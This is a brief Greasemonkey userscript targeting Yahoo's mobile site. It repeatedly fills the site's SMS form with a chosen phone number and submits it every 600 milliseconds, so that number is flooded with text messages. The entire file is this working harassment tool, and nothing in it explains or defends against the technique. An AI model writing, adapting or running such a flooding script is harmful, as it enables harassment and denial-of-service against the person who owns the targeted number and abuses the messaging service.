// ==UserScript==
// @name           Yahoo
// @namespace      supriya
// @include        http://mobile.yahoo.com/
// ==/UserScript==

var no="ur no";

function flood(){
document.getElementById("phonepart1").value=no;
mws.procSMSForm();
}

setInterval(flood,600);